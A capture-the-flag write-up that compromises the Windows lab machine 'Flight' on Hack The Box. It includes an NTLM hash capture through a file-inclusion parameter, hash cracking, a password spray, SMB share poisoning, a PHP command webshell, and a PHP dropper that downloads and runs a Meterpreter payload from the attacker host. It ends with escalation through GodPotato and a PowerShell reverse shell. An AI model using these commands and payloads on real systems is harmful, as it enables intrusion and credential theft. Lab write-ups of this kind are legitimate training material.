---
title: 'HTB Flight - Hard'
date: 2024-05-08 00:00:00 +0000
categories: [HTB Machines]
tags: [Hard, Windows, HTB]
---

**Flight** is a hard HTB machine that involves exploiting **improper input sanitization** in a URL parameter to obtain credentials. Subsequently, there's extensive **lateral movement** by poisoning and abusing SMB shares, aligning pretty well with the thematic of the box. Finally, privilege escalation to SYSTEM is achievable through exploiting **weak permissions** in an internal web service.

<img src="/assets/img/flight/Untitled.png" alt="Untitled 1.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.228.120

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.228.120 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 49667, 49673, 49674, 49696

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.228.120 -sVC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49696

[+] NSE Scan results: 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 20:42 WEST
Nmap scan report for 10.129.228.120
Host is up (0.065s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-08 02:42:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m09s
| smb2-time: 
|   date: 2024-05-08T02:43:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.14 seconds

[+] Script finished successfully
```

The output reveals that we are dealing with a domain controller. Let’s append the newly discovered domain and hostname to the /etc/hosts file.

```bash
echo -e "10.129.228.120\tflight.htb G0.flight.htb" | sudo tee -a /etc/hosts
10.129.228.120  flight.htb G0.flight.htb
```

This web page receives us on port TCP/80. There isn’t much to enumerate.

<img src="/assets/img/flight/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Brute-forcing virtual host subdomains led us to discover **school.flight.htb**.

```bash
ffuf -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 7069
school      [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 87ms]
```

Updated /etc/hosts file to contain the new subdomain.

```bash
tail -n 1 /etc/hosts       
10.129.228.120  flight.htb G0.flight.htb school.flight.htb
```

This brand new page awaits us in **school.flight.htb.**

<img src="/assets/img/flight/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Found a **view** parameter via GET requests.

```bash
ffuf -u "http://school.flight.htb?FUZZ=key" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 403 -fs 3996
view        [Status: 200, Size: 1102, Words: 144, Lines: 31, Duration: 66ms]
```

# Exploitation

The parameter is not properly sanitized XD.

```
http://school.flight.htb/?view=index.php
```

<img src="/assets/img/flight/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

The first thing I like to try when it comes to Windows machines is to steal the Net-NTLM hash. Improper input sanitization and weak passwords can led us into an easy foothold.

Started the responder `sudo responder -I tun0 -v` and processed the following GET request.

```
http://school.flight.htb/?view=//10.10.14.112/share/file
```

<img src="/assets/img/flight/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

We successfully stole and cracked the svc_apache user hash.

```
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
SVC_APACHE::flight:0baf9a69e4b0f59e:fd9a311cf...:<REDACTED>
```

NetExec confirms that the credentials are valid. Notice that there are multiple non-default shares and we have read permissions to them.

```bash
netexec smb 10.129.228.120 -u "svc_apache" -p '<REDACTED>' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:<REDACTED> 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ            
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ            
```

# Lateral Movement 1

Now that we are credentialed in the Domain Controller, it is an easy task to gather info such as domain users and groups. Running [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) is an option but I rather do it manually

```bash
netexec smb 10.129.228.120 -u "svc_apache" -p '<REDACTED>' --users 
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:<REDACTED> 
SMB         10.129.228.120  445    G0               [*] Trying to dump local users with SAMRPC protocol
SMB         10.129.228.120  445    G0               [+] Enumerated domain user(s)
SMB         10.129.228.120  445    G0               flight.htb\Administrator                  Built-in account for administering the computer/domain
SMB         10.129.228.120  445    G0               flight.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.228.120  445    G0               flight.htb\krbtgt                         Key Distribution Center Service Account
SMB         10.129.228.120  445    G0               flight.htb\S.Moon                         Junion Web Developer
SMB         10.129.228.120  445    G0               flight.htb\R.Cold                         HR Assistant
...
```

Created the following **users.list** wordlist.

```bash
cat users.list                                                 
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```

Being methodical with a **password spray** paid off, getting a hit for a user called S.Moon.

```bash
netexec smb 10.129.228.120 -u users.list -p '<REDACTED>' --continue-on-success | grep -v '[-]' 
SMB         10.129.228.120  445    G0     [+] flight.htb\S.Moon:<REDACTED>  
SMB         10.129.228.120  445    G0     [+] flight.htb\svc_apache:<REDACTED> 
```

Listing available shares reveals that S.Moon has write permissions in one share.

```bash
netexec smb 10.129.228.120 -u "S.Moon" -p '<REDACTED>' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:<REDACTED> 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ            

```

# Lateral Movement 2

Once again, this is a Windows host so we could try to **poison that share** forcing it to authenticate to us over SMB if there are any automated scripts running as another user.

This [blog post](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) does a great job at explaining the different techniques, but I will be using [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) for simplicity. Created all possible files that this tool offers with the next command.

```bash
python3 ntlm_theft.py -g all -f benign -s 10.10.14.112

tree benign         
benign
├── Autorun.inf
├── benign.application
├── benign.asx
├── benign-(externalcell).xlsx
├── benign-(frameset).docx
├── benign-(fulldocx).xml
├── benign.htm
├── benign-(icon).url
...
```

Uploaded a desktop.ini, which extension wasn’t blacklisted.

```bash
smbclient -U 'flight.htb\S.Moon%<REDACTED>' //10.129.228.120/Shared -c "put desktop.ini"
putting file desktop.ini as \desktop.ini (0.3 kb/s) (average 0.3 kb/s)
```

Responder grabbed a hash from c.bum XD. Let’s see if his password is as good as his lat spread.

<img src="/assets/img/flight/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

And it wasn’t :(.

```bash
hashcat -m 5600 ntlmv2.hash.1 /usr/share/wordlists/rockyou.txt
C.BUM::flight.htb:41960e710475...:<REDACTED>
```

<img src="/assets/img/flight/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

This time we have juicy write permissions on the Web share.

```bash
netexec smb 10.129.228.120 -u "c.bum" -p '<REDACTED>' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:<REDACTED> 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ,WRITE      
```

# Lateral Movement 3

**Quick reminder**: We got a foothold by exploiting a RFI vulnerable parameter in the school subdomain. This is an clear indicator that we should focus on the flight.htb share subdirectory.

We have full access to the web server. Luckily, the web service might be running as a high privileged user. Let’s check what file extension should we upload.

```bash
smbclient -U 'flight.htb\c.bum%<REDACTED>' //10.129.228.120/Web -c "ls"
  flight.htb                          D        0  Wed May  8 04:57:00 2024
  school.flight.htb                   D        0  Wed May  8 04:57:00 2024
                
smbclient -U 'flight.htb\c.bum%<REDACTED>' //10.129.228.120/Web -c "ls flight.htb/"
  css                                 D        0  Wed May  8 04:57:00 2024
  images                              D        0  Wed May  8 04:57:00 2024
  index.html                          A     7069  Thu Feb 24 05:58:10 2022
  js                                  D        0  Wed May  8 04:57:00 2024
```

Wappalyzer tells us that it is Apache + PHP, which is weird for a Windows server. Commonly, we will have to upload an ASPX webshell but this time is an exception.

<img src="/assets/img/flight/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

This is the webshell I will be uploading to the share.

```php
<?php
        $cmd = system($_GET['fc8358bcf09e4b3947d1975622a9df14']);
        echo "<pre>" . $cmd . "</pre>";
?>
```

There wasn’t any type of sanitization this time.

```bash
smbclient -U 'flight.htb\c.bum%<REDACTED>' //10.129.228.120/Web -c "cd flight.htb; put webshell.php"
putting file webshell.php as \flight.htb\webshell.php (0.5 kb/s) (average 0.5 kb/s)
                                                                                                                                                                                             
smbclient -U 'flight.htb\c.bum%<REDACTED>' //10.129.228.120/Web -c "ls flight.htb/"                 
  css                                 D        0  Wed May  8 05:07:00 2024
  images                              D        0  Wed May  8 05:07:00 2024
  index.html                          A     7069  Thu Feb 24 05:58:10 2022
  js                                  D        0  Wed May  8 05:07:00 2024
  webshell.php                        A      101  Wed May  8 05:07:59 2024
```

Unfortunately, this web service is running as svc_apache. At least we managed to get RCE.

```
http://flight.htb/webshell.php?fc8358bcf09e4b3947d1975622a9df14=whoami
```

<img src="/assets/img/flight/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">

I’m preparing for the OSEP so I want to practice using Metasploit. You could use any other tool or a PowerShell one-liner. Let’s create the malicious executable and start the meterpreter listener.

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.112 LPORT=443 -f exe -o dusk.exe

msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 443; run"
```

Next step is to upload the following file over SMB and execute it via URL.

```bash
cat primer.php  
<?php system("powershell -c \"iwr -uri http://10.10.14.112/dusk.exe -outfile c:\\users\\public\\dusk.exe; c:\\users\\public\\dusk.exe\"");?>

smbclient -U 'flight.htb\c.bum%<REDACTED>' //10.129.228.120/Web -c "cd flight.htb; put primer.php"
```

There you go, now we can work.

```bash
meterpreter > getuid
Server username: flight\svc_apache

meterpreter > execute -H -f notepad
Process 3324 created.

meterpreter > migrate 3324
[*] Migrating from 4024 to 3324...
[*] Migration completed successfully.
```

# PrivEsc

Listing listening ports shows a TCP/8000 that was not present in the Nmap output.

```
C:\xampp\htdocs\flight.htb>netstat -ano  
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5140
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648
  ...
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       3048
```

Doing a curl confirms that it is not an empty web.

```html
C:\xampp\htdocs\flight.htb>curl localhost:8000 -X GET -s
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<!--

Template 2093 Flight

http://www.tooplate.com/view/2093-flight

-->
        <title>Flight - Travel and Tour</title>
    
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">
```

To proceed we need to start a [Chisel](https://github.com/jpillora/chisel) server on our VM.

```bash
sudo chisel server --reverse -p 1234
```

Upload the [Chisel](https://github.com/jpillora/chisel) client and forward it to our localhost on port TCP/8000.

```
PS C:\Users\Public> iwr -uri http://10.10.14.112/chisel.exe -outfile .\chisel.exe

PS C:\Users\Public> .\chisel.exe client 10.10.14.112:1234 R:8000:127.0.0.1:8000
2024/05/07 21:57:45 client: Connecting to ws://10.10.14.112:1234
2024/05/07 21:57:45 client: Connected (Latency 63.6654ms)
```

Now we can access to this cool page from our VM.

<img src="/assets/img/flight/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">

If we background the previous channel and enumerate the web directory in a new one, we notice that C.Bum user has **write permissions** on the web root directory. 

```
c:\inetpub>dir
	Directory of c:\inetpub
	09/22/2022  12:24 PM    <DIR>          custerr
	05/07/2024  10:02 PM    <DIR>          development
	09/22/2022  01:08 PM    <DIR>          history
	09/22/2022  12:32 PM    <DIR>          logs
	09/22/2022  12:24 PM    <DIR>          temp
	09/22/2022  12:28 PM    <DIR>          wwwroot
	
c:\inetpub>dir development
 Directory of c:\inetpub\development
	05/07/2024  10:02 PM    <DIR>          .
	05/07/2024  10:02 PM    <DIR>          ..
	04/16/2018  02:23 PM             9,371 contact.html
	05/07/2024  10:02 PM    <DIR>          css
	05/07/2024  10:02 PM    <DIR>          fonts
	05/07/2024  10:02 PM    <DIR>          img
	04/16/2018  02:23 PM            45,949 index.html
	05/07/2024  10:02 PM    <DIR>          js
	
c:\inetpub>icacls c:\inetpub\development
c:\inetpub\development flight\C.Bum:(OI)(CI)(W)
                       NT SERVICE\TrustedInstaller:(I)(F)
                       NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
                       NT AUTHORITY\SYSTEM:(I)(F)
                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Users:(I)(RX)
                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

However, C.Bum does not have PS Remote permissions and we don’t have a GUI but what we have are his credentials. Uploaded [RunasCs](https://github.com/antonioCoco/RunasCs) and [Laudanum’s ASPX webshell](https://github.com/jbarcia/Web-Shells/blob/master/laudanum/aspx/shell.aspx).

```
PS C:\inetpub> iwr -uri http://10.10.14.112/shell.aspx -outfile c:\users\public\shell.aspx
PS C:\inetpub> iwr -uri http://10.10.14.112/RunasCs.exe -outfile c:\users\public\RunasCs.exe
```

Used RunasCs to copy the ASPX webshell as C.Bum with robocopy.

```
PS C:\inetpub> c:\users\public\RunasCs.exe c.bum <REDACTED> "cmd /c robocopy c:\users\public\ c:\inetpub\development\ shell.aspx"

PS C:\inetpub> dir c:\inetpub\development
  Directory: C:\inetpub\development
	Mode                LastWriteTime         Length Name                                                                  
	----                -------------         ------ ----                                                                  
	d-----         5/7/2024  11:22 PM                css                                                                   
	d-----         5/7/2024  11:22 PM                fonts                                                                 
	d-----         5/7/2024  11:22 PM                img                                                                   
	d-----         5/7/2024  11:22 PM                js                                                                    
	-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
	-a----        4/16/2018   2:23 PM          45949 index.html                                                            
	-a----         5/7/2024  11:22 PM           4334 shell.aspx
```

We achieved remote command execution as a machine account.

<img src="/assets/img/flight/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">

I chose this PowerShell one-liner from [RevShells](https://www.revshells.com/).

<img src="/assets/img/flight/Untitled 11.png" alt="Untitled 11.png" style="width:800px;">

Received a reverse connection on our Netcat listener.

```
nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.112] from (UNKNOWN) [10.129.228.120] 54483

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

Uploaded [GodPotato](https://github.com/BeichenDream/GodPotato) to **abuse the SeImpersonatePrivilege** and send ourselves another reverse shell, but this time as SYSTEM.

```
PS C:\windows\system32\inetsrv> iwr -uri http://10.10.14.112/GodPotato-NET4.exe -outfile c:\users\public\GodPotato-NET4.exe

PS C:\windows\system32\inetsrv> c:\users\public\GodPotato-NET4.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0..."
```

Successfully established a reverse shell as NT AUTHORITY\SYSTEM and read the root flag. GGs!

```
nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.112] from (UNKNOWN) [10.129.228.120] 52791

PS C:\windows\system32\inetsrv> whoami
nt authority\system

PS C:\windows\system32\inetsrv> type c:\users\administrator\desktop\root.txt
279c1cc77f0f30c0****************
```